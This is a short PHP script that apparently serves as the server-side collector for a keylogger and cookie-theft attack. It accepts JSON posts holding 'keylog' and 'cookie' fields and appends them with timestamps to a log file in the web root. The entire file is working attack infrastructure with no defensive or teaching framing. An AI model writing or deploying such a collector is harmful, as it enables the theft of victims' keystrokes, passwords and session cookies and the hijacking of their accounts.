<?php
header('Content-Type: text/html; charset=UTF-8');
$data = json_decode(file_get_contents('php://input'), true);

$keylog = (isset($data['keylog']) && $data['keylog'] != '') ? $data['keylog'] : null;
$cookie = (isset($data['cookie']) && $data['cookie'] != '') ? $data['cookie'] : null;

$time = date('Y-m-d H:i:s');
$filename = '/var/www/html/log.txt';

$text = "[$time]\n\n" . "KEYLOG:\n" . $keylog . "\n" . "COOKIE:\n" . $cookie . "\n";

file_put_contents($filename, $text, FILE_APPEND);
?>

